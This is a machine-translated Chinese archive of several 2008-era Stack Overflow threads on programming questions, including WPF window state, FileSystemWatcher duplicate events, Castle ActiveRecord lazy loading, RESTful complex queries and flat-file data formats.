而且我有一种感觉，这不是一件容易的事，所以......你很幸运;）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-19T19:36:16.110

这是不可能的，除非它在数据库中并且您编写了一个在两种语言之间都可以使用的（反）序列化算法。如果它应该是只读访问，我会为此目的设置一个具有只读访问权限的用户。

如果它存储在文件系统上，我认为访问它是不安全的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-19T19:48:34.040

好吧，您确实需要更详细地描述这些作品，但如果可能的话，这将是不平凡的。

Response.Redirect 到 cart.php?inputparams=foo 怎么样 -> 工作 -> PHP 重定向到thankyou.aspx?inputparams=bar

您可以将 PHP 作为服务使用吗？

或者将 PHP 的输出请求为 HTTPWebRequest？

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-12-19T21:41:59.320

这里有几个选项。虽然 Java 有更多的集成选项，特别是对于会话，但 C#/.Net 可能会依赖其他产品进行通信。

如果这是后台处理（例如结帐后处理已完成的订单），它可能会更简单。但是，您想混合使用 Web 应用程序。您想要混合它们的方式和内容可能（并且可能确实）使这变得相当困难 - 或者至少是未知的水域。毕竟，PHP 在 IIS 下的 Apache 和 .Net Web 应用程序下运行。

您将不得不通过另一个技术层。其他人提到了数据库，但这对于实时 Web 应用程序上的会话存储来说不是一个可行或高性能的解决方案。

您最好的选择可能是[memcached](http://www.danga.com/memcached/)，它至少有一个 C# 客户端库。这是一个[使用 memcached 的跨平台序列化](http://www.socialtext.net/memcached/index.cgi?cross_platform_serialisation_support)示例。

[如果您有后台工作处理， beantalkd](http://xph.us/software/beanstalkd/)也可能值得考虑。它是一个分布式工作队列进程，具有多个客户端库（例如 Ruby、PHP、Perl、Erlang）。我看不到 C# 版本，但可能可以做到。请参阅[协议文档](http://github.com/kr/beanstalkd/tree/v1.1/doc/protocol.txt?raw=true)。

我提到这一点是因为您可以让 PHP 向 beanstalkd 写入工作请求，而不是 C# 轮询或询问 PHP 会话。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2009-11-10T09:29:56.960

PHP 将其会话存储在文件中。客户端 cookie 包含文件名，php.ini 包含路径。

从dotnet访问php会​​话数据应该比较简单。我正在寻找一个这样做的图书馆，但如果我找不到，我会自己写一个。

# wpf - 如何判断 WPF 窗口是否已关闭？

> ID：381973
> 
> 赞同：59
> 
> 时间：2008-12-19T19:32:55.727
> 
> 标签：wpf

我正在开发一个显示一些子窗口的应用程序，这些子窗口可以由用户关闭或自动关闭。在调试一些抛出的异常时，我发现我试图调用方法，比如`Hide()`在已经关闭的窗口上；这个特定的代码分支对这两种情况都是通用的，我没有注意到这一点。

我的第一个想法是寻找`Window`表明窗户已关闭的属性。我似乎找不到一个。在 WinForms 中，我会在*IsDisposed*属性中寻找一个有点可靠的指标，表明表单已关闭（它不能可靠地用于对话框，但我不使用对话框。）我没有看到任何等效的东西`Window`. 的文档`Window.Close()`似乎没有表明该方法更改的任何属性。我是否遗漏了一些明显的东西，或者是知道窗口是否已关闭以处理`Closed`事件的唯一方法？对于一项简单的任务，这似乎是一种苛刻的要求。

* * *

## 回答 #1

> 赞同：66
> 
> 时间：2008-12-19T19:53:07.340

根据MSDN WPF 论坛上的[此对话](http://social.msdn.microsoft.com/Forums/en-US/wpf/thread/c521ac47-7326-483a-be60-42de0e355711/)（请参阅最后一篇文章），您可以检查 IsLoaded 是否为 false，这意味着该窗口“有资格”卸载其内容。我希望这对你有用！

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2016-04-04T11:00:48.707

如果你从 Window 类派生，你可以这样做：

```
public bool IsClosed { get; private set; }

protected override void OnClosed(EventArgs e)
{
    base.OnClosed(e);
    IsClosed = true;
} 
```

与注册 Closed 事件相比，它具有优势 - 无需取消注册回调。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2014-10-14T08:25:09.577

希望这对您有用：

PresentationSource.FromVisual(window) == null;

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2011-12-07T02:34:37.483

另一种方式：[Application.Windows](http://msdn.microsoft.com/en-us/library/system.windows.application.windows.aspx)包含打开的窗口列表。您可以检查此集合是否包含您的窗口（关闭后将其删除）。

看起来你必须打电话`OfType<Window>()`，因为它是一个专门的集合。

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2015-10-16T09:28:03.967

我的解决方案是简单地将事件附加到对话框的`Closed`事件：

```
MikesDialog dlg = new MikesDialog();
dlg.Closed += delegate
{
    //  The user has closed our dialog.
    validationgDlg = null;
};

//  ...elsewhere in the code...

if (validationgDlg != null)
{
     //  Our "MikesDialog" is still open...
     . . .
} 
```

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2015-09-24T16:10:24.580

我不知道为什么*IsDisposed*属性是内部的，但如果你不害怕反射：

```
var window = new Window();
var propertyInfo = typeof(Window).GetProperty("IsDisposed", BindingFlags.NonPublic | BindingFlags.Instance);
var isDisposed = (bool)propertyInfo.GetValue(window); 
```

话虽如此，反射不应被过度使用，因为您不再受到该类的公共 API 的保护。如果您走这条路，请务必至少使用单元测试。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2018-01-17T22:03:24.527

您可以向 WindowClass 添加非静态属性，并在事件`bool IsClosed`上设置为 true ：`Closed`

```
public partial class MyWindow : Window
{
    public bool IsClosed { get; set; } = false;
    public MyWindow()
    {
        Closed += MyWindow_Closed;
        InitializeComponent();
    }
}    

private void MyWindow_Closed(object sender, EventArgs e)
{
   IsClosed = true;
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-09-28T09:32:54.523

在某些情况下检查`Application.Current.MainWindow.IsActive`就足够了

# objective-c - Key-Value coding and its scripting capability

> ID：381974
> 
> 赞同：3
> 
> 时间：2008-12-19T19:33:03.480
> 
> 标签：objective-c, cocoa, cocoa-touch, key-value-observing

I have an object which straight forward instance variables. Some are NSString, some are unsigned ints, etc. I was under the impression Key-Value coding was scriptable in that I could write code such as the following:

```
 id key, value;
   key      = [[attributes objectAtIndex:j] name];
   value    = [[attributes objectAtIndex:j] stringValue];
   [obj setValue:value forKey:key]; 
```

The reason I'm using stringValue here and name is I'm working with TouchXML and building objects from XML feeds.

The code above crashes if I try to assign anything to an integer. If I change my unsigned int to an instance of NSString, there isn't any run-time crashes. It was to my understanding that Key-Value coding is smart enough to detect these issue.

What are my possible solutions? How can I abstract this as much as possible so I can run the same method on many different classes which all have their own instance variables?

Is the most elegant method to really override my setter and use NSNumber to convert the string into a type int, which I thought was already handled by KVC?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-19T20:10:46.897

KVC doesn't do any type coercion/translation internally, so the type of the object you pass into `setValue:forKey:` must match the type of the instance variable it will be stored in. Native types such as `int`, `long`, etc. are packaged up into `NSNumber` objects, and things like structs get packed into `NSValue` objects. To set a value that's declared as a native type, you should pass an appropriate wrapper object in for the value argument.

I would also recommend doing any required translation in the code that's calling the setter, and not in the setter itself. That's more a matter of opinion though, so I suppose you could translate stuff in the setter if you really want to. My version of your code would look something like:

```
id key, value;
key = [[attributes objectAtIndex:j] name];
value = [NSNumber numberWithInt:[[[attributes objectAtIndex:j] stringValue] intValue]];
[obj setValue:value forKey:key]; 
```

# vb.net - 在 FileSystemWatcher 中处理多个更改事件

> ID：381976
> 
> 赞同：4
> 
> 时间：2008-12-19T19:33:38.253
> 
> 标签：vb.net, filesystemwatcher

我有以下子：

```
 Private Sub Watcher_Changed(ByVal sender As System.Object, ByVal e As FileSystemEventArgs)
        If Path.GetExtension(e.Name) = ".p2p" Then
            Exit Sub
        Else
            Try
                ' multiple change events can be thrown. Check that file hasn't already been moved.
                While Not File.Exists(e.FullPath)
                    Exit Try
                End While

                ' throw further processing to a BackGroundWorker
                ChangedFullPath = e.FullPath
                ChangedFileName = e.Name

                FileMover = New BackgroundWorker
                AddHandler FileMover.DoWork, New DoWorkEventHandler(AddressOf ProcessFile)
                FileMover.RunWorkerAsync()
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try

        End If
    End Sub 
```

当通过 FTP 上传文件时，我仍然收到多个更改文件通知。

我想修改 Try ，如果它在过去（时间）内发生，它也会抛出更改通知——比如说 3 秒。它应该是微不足道的，但由于某种原因，它今天没有出现在我的脑海中，我的思绪也没有围绕着我在谷歌上找到的答案。

谢谢，斯科特

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-12-20T06:11:55.623

几年前，我创建了一项服务来上传转储到 FTP 文件夹的文件，以下是我所做的一些事情，可以帮助您解决问题：

1.  我测试了所有的 NotifyFilters 并选择了删除重复通知的那个（*仅*使用NotifyFilters.Size 为每个创建的文件提供了可靠的通知，并消除了几乎所有重复的通知）
2.  在 Watcher_Changed 事件中，我忽略了事件 args 中包含的文件，只处理了当前文件夹中的所有文件；我尝试将文件夹中的所有文件添加到队列中，如果它们已经在队列中，我跳过下面的 3。
3.  我为找到的每个独特的新文件创建一个新线程；我的线程尝试获取文件的锁定，如果不能，则意味着其他进程仍在访问它（它仍在上传等），因此我的线程休眠并在短时间间隔后再次尝试。
4.  当一个文件被完全处理后，线程做的最后一件事就是将它移动到一个存档文件夹，然后将它从队列中删除，这样它就不会被意外地再次处理。

这似乎对我有用，并且该服务可靠地运行了几个月上传文件，直到我离开那份工作。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-19T21:03:44.310

我们也有类似的情况；但是，批量写入文件的系统使用临时名称，并在完成后将其更改为“真实”名称。你的 ftp 客户端可以做类似的事情吗？如果可以，那么您可以检查新文件名并通过扩展名或前缀进行检查；如果它不是预期的最终文件名格式，那么您可以忽略它。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-19T21:14:41.357

我之前遇到过确切的情况，最终实现了一个计时器机制来等待文件“稳定”，或者写事件停止进入 x 时间。

有点笨拙，但它奏效了。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-31T15:21:41.483

需要注意的一件事是访问文件可以更改文件属性之一，例如“访问时间”或其他内容。如果您没有正确设置通知过滤器，则可以触发另一个事件。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-05-26T20:25:02.497

我遇到了同样的问题，我正在保存一个通过代码上传的文件，删除和创建每次都会触发两次。我所要做的就是在处理之前检查文件是否存在。

```
private void fsw_Created(object sender, FileSystemEventArgs e)
{
   if (File.Exists(e.FullPath))
   {
      //process the file here
   }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-11-26T18:47:45.840

我今天尝试在更改时自动重新加载配置文件时遇到了同样的问题。我最终计算了文件的 MD5 哈希，以确定文件是否实际发生了更改，并且只有在哈希不同时才重新加载。这是我可以过滤掉重复项的唯一确定方法。

我曾短暂地考虑过使用计时器机制来过滤掉更改通知，但感觉就像 pete-m，但我觉得这是一个太不干净的解决方案。

我尝试仅查看 LastWrite 时间更改，但这没有用。我仍然收到重复的通知。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-12-12T20:07:19.353

我正在尝试检测 excel 文件何时更改，但遇到了更改事件未触发的问题，因为我只关心单个文件设置过滤器不起作用。当我删除过滤器并查看触发的事件时，事件参数名称属性看起来是随机生成的名称，而不是我知道已更改的特定文件名。

因此，当特定的 excel 文件发生更改时，我无法获得简单的通知。

# crystal-reports - 水晶报告 11：不会否定 totext 中的数字值

> ID：381978
> 
> 赞同：1
> 
> 时间：2008-12-19T19:33:49.360
> 
> 标签：crystal-reports

使用水晶报表 11，当数据库字段的值为“信用备忘录”时，我试图获得一个小计以强制它显示负数。

正如您在 if trantypeilocal = "credit memo" 语句下方的注释中看到的那样，我尝试否定 totext 函数中的值，但这不起作用。所以我想我会尝试将它分配给一个变量，这也会引发错误。

```
Numbervar subtot 

if PageNumber = TotalPageCount then
    (
      // ToText({tarPrintInvcHdrWrk.SalesAmt})
        if {tarPrintInvcHdrWrk.TranTypeIDLocal} = "Credit Memo" then 
         (
            subtot :=  {tarPrintInvcHdrWrk.SalesAmt}-{tarPrintInvcHdrWrk.ShipAmt}-{#FreightAndHandling};
            //ToText (-({tarPrintInvcHdrWrk.SalesAmt}-{tarPrintInvcHdrWrk.ShipAmt}-{#FreightAndHandling}) , {tarPrintInvcHdrWrk.MCDecPlaces} )
            ToText (-(subtot));
            )
        else
        ( 
        ToText ({tarPrintInvcHdrWrk.SalesAmt}-{tarPrintInvcHdrWrk.ShipAmt}-{#FreightAndHandling}, {tarPrintInvcHdrWrk.MCDecPlaces} )
        )
    )
    else
       "**********" 
```

错误消息说：

> 其余文本似乎不是公式的一部分。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-22T15:36:00.757

我暂时通过在 if 语句中连接以下内容来找到一个临时解决方案。

```
"-" + ToText ({tarPrintInvcHdrWrk.SalesAmt}-{tarPrintInvcHdrWrk.ShipAmt}-{#FreightAndHandling}) , {tarPrintInvcHdrWrk.MCDecPlaces} 
```

# lazy-loading - 帮助 ActiveRecord 异常“无法延迟初始化集合 - 无会话”

> ID：381980
> 
> 赞同：3
> 
> 时间：2008-12-19T19:35:02.400
> 
> 标签：lazy-loading, castle-activerecord

我正在使用 Castle ActiveRecord 编写一个 Web 应用程序，每当我尝试访问延迟加载的相关对象列表时，我都会收到此异常。这是我的代码：

```
 using(new SessionScope())
        {
            foreach (var field in eventObj.RegistrationFields)
            {
                //Do something with the field here...
            }
        } 
```

RegistrationFields 属性如下所示：

```
 [HasMany(Inverse = true, Lazy = true)]
    public IList<EventRegistrationField> RegistrationFields { get; set; } 
```

当为 foreach 循环访问“eventObj.RegistrationFields”时会发生异常。我还确保在我的 activeRecord 配置设置中设置了 isweb="true" 属性。有谁知道为什么会发生这种情况？这是我的配置：

```
<connectionStrings>
  <add name="main" connectionString="Data Source=localhost\SQLEXPRESS;Initial Catalog=EventScheduler;Integrated Security=SSPI"/>
</connectionStrings>
<activerecord isWeb="true">
  <config>
    <add key="hibernate.connection.driver_class" value="NHibernate.Driver.SqlClientDriver"/>
    <add key="hibernate.dialect" value="NHibernate.Dialect.MsSql2005Dialect"/>
    <add key="hibernate.connection.provider" value="NHibernate.Connection.DriverConnectionProvider"/>
    <add key="hibernate.connection.connection_string_name" value="main"/>
  </config>
</activerecord> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-22T12:09:20.223

我认为您对会话感到困惑。`RegistrationFields`是 的惰性属性`eventObj`。加载的会话`eventObj`将负责加载`RegistrationFields`。您正在使用 明确打开一个新会话`new SessionScope()`，这会创建一个`eventObj`未绑定的新会话；因此它没有拥有会话来获取数据。即使原始会话仍然存在，调用也会嵌套一个新会话并隐藏旧会话，直到在当前范围内调用`new SessionScope()`它才能看到。`Dispose()`对象不会自动将自己附加到当前会话。这是预期的 NHibernate 行为。

看起来您正在尝试按工作单元进行会话，这很好，但是对象的加载*和*所有这些对象的惰性集合的解析必须在该工作单元内进行。

您可以尝试移动到每个请求的会话（请参阅 Castle 文档以了解如何实现这一点）并删除 SessionScope 创建。这将使您的对象在页面请求期间保持活动状态（就任何惰性集合应该存在于 Web 应用程序中而言）。但是，您必须注意，在这种情况下，您对持久对象所做的任何更改都将在会话刷新时写入数据库（实际上，您应该将持久对象状态的更改视为对底层对象的更改）数据，就好像它们是相同的操作一样——那么你就不会出错）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T20:14:49.137

eventObj 是什么时候加载的？这也需要在会话中。此外，请查看文档的[ActiveRecord 集成](http://www.castleproject.org/monorail/documentation/trunk/integration/ar.html)部分：

# web-services - 创建 RESTful 复杂查询的最佳方法是什么？

> ID：381983
> 
> 赞同：6
> 
> 时间：2008-12-19T19:35:57.967
> 
> 标签：web-services, rest

从 REST 服务中检索复杂查询的最佳方式是什么？

假设我想获取 X 个集合，对每个集合应用过滤器和方程式，使用其他操作组合集合并返回一个结果，所有内容都在一个请求中。

将所有内容都放在查询字符串中太复杂（而且太大），因为我可以组合 300 多个集合（加上每个集合的运算符和过滤器）。

我考虑过使用 POST 将描述查询的 XML 对象发送到以下内容：

```
http://mydomain/collections/complexQuery 
```

它会返回一个唯一的 ID，然后我可以使用 GET 来检索 complexQuery 结果：

```
http://mydomain/collections/complexQuery/{queryId} 
```

**杰森 S：**

这就是想法。POST 将采用查询的 XML 表示，已经带有“where”参数（它们可能太多）。只有在 GET 到达时才会执行查询。我可以让查询对象只可用一段时间，然后再将其删除。

这是一个好的解决方案吗？我还在做这件事吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T19:38:14.063

这是标准的 RESTful 方法。`POST`到资源并期望一个`201 Created`（没有实体主体）带有 URI 到`Location`标头中创建的结果。您还可以返回带有`200 OK`响应的结果，还可以选择一个指向结果的 URI 以供将来在响应中（取消）引用以及结果的副本。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-19T19:50:22.587

如果您使用唯一 ID，对我来说听起来很 RESTful。如果查询结果集很大，您可能希望包括一种询问结果集行 M - N 的方法，其中 M,N 是参数。

我猜您的唯一 ID 方法（带有存储在服务器上的查询定义状态）的一个优点是您可以将查询结果用作另一个查询的参数。甚至可能将 POSTING 查询的定义与查询的执行分开。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-17T17:02:55.803

没关系。但它引入了几个问题：

1.  您必须将查询数据保留在服务器上，何时清理旧查询？
2.  如果您清理旧查询，则意味着您无法提供指向已保存查询的链接，因为它们可能已被清理。

3.  即使是简单的查询也需要两次往返（POST & then GET）

4.  您的客户需要熟悉您期望的 XML 模式，而不是众所周知的： `param1=val1&param2=val2`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-16T18:42:34.317

对不起，我的无知...

但为什么不直接用帖子返回数据？？？

我可以理解为什么使用 get 更新数据是错误的，但我不明白为什么必须强制在每个帖子中更新数据？

我也明白这个想法是每个 get 方法都可能被缓存（因为它们不修改数据），但在这种情况下，它们只能在临时保存的查询仍然处于活动状态时被缓存......这增加了另一层复杂...

我还以为，rest的原则之一就是定义无状态（如http协议）接口，在这种情况下，服务器正在维护一个状态来解决查询......

我刚刚开始阅读有关休息的内容，并且有几件事我还不明白...

# workflow-foundation - 有没有办法在 Windows 工作流中检查顺序工作流？

> ID：381986
> 
> 赞同：0
> 
> 时间：2008-12-19T19:36:16.203
> 
> 标签：workflow-foundation, sequential-workflow

状态机工作流具有 StateMachineWorkflowInstance 类，您可以使用它来检查工作流的当前状态、获取合法转换等……顺序工作流有类似的东西吗？我想有一种简单的方法来以编程方式找出工作流当前处于什么状态。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-21T12:21:15.083

工作流程跟踪将为您提供有关顺序工作流程当前状态的大量信息。如果需要，它甚至可以从工作流程中提取自定义数据并将其存储为跟踪数据的一部分。默认情况下，它会跟踪工作流本身的所有状态更改以及其中的所有活动。

SqlTrackingQuery 对象有助于从数据库中获取跟踪数据，但编写自己的 SQL 查询也很简单。

[http://wiki.windowsworkflowfoundation.eu/default.aspx/WF/SqlTrackingService.html](http://wiki.windowsworkflowfoundation.eu/default.aspx/WF/SqlTrackingService.html)

# .net - 将数据存储在平面文件中的软件，常见的编码/文件格式技术是什么

> ID：381988
> 
> 赞同：1
> 
> 时间：2008-12-19T19:37:38.103
> 
> 标签：.net, file, formatting, storage

我被使用 sql server 存储数据或使用 xml 文件宠坏了。

将数据存储在 xml 和 CSV 以外的平面文件中的常用技术是什么。

我知道很多次当我打开文件时数据都是混乱的，这意味着它是编码的吗？

有什么我可以在某处读到的常用技术吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T19:42:30.620

[亚AML](http://www.yaml.org/)。从[网站](http://www.yaml.org/start.html)：

> YAML 是适用于所有编程语言的人性化数据序列化标准。

示例（再次，[来自网站](http://www.yaml.org/start.html)）：

> 以下是通过 YAML(tm) 表示的发票示例。结构通过缩进（一个或多个空格）显示。序列项用破折号表示，映射中的键值对用冒号分隔。

```
invoice: 34843
date   : 2001-01-23
bill-to: &id001
    given  : Chris
    family : Dumars
    address:
        lines: |
            458 Walkman Dr.
            Suite #292
        city    : Royal Oak
        state   : MI
        postal  : 48046
ship-to: *id001
product:
    - sku         : BL394D
      quantity    : 4
      description : Basketball
      price       : 450.00
    - sku         : BL4438H
      quantity    : 1
      description : Super Hoop
      price       : 2392.00
tax  : 251.42
total: 4443.52
comments: >
    Late afternoon is best.
    Backup contact is Nancy
    Billsmer @ 338-4338. 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-19T19:51:38.670

取决于你的要求。如果它需要人类可读，那么 YAML、XML 和 CVS 都很好。

但是，如果您需要性能或存储二进制值（例如 8 字节双精度值），那么我个人使用 Java 出色的 DataOutputStream 和 DataInputStream 创建自己的文件格式。但是在创建自己的格式时要小心。您通常不想与世界分享它，否则您将需要关心安全性和可扩展性。您将始终需要关心数据完整性，并且可能会添加一些 crc 校验和。

很难获得正确的自定义二进制平面文件，因此请确保您确实需要一个并寻求帮助！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-19T19:47:01.877

文件完全“混乱”并不意味着它已被编码。它仅意味着它以某种二进制格式而不是文本格式保存。
当您以二进制格式保存时，您只需将数据原样写入程序存储器中。例如，要写入整数，您直接写入整数的 4 个字节，而不是将其转换为文本。这具有节省空间的优点。
如果您使用记事本打开这样的文件，您将看到的只是随机字符。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-19T19:52:17.263

出于完整性考虑，我将提到古老的[.ini 格式](http://en.wikipedia.org/wiki/INI_file)，但我无法想象不以 XML 或 YAML 格式编写平面文件数据失败。************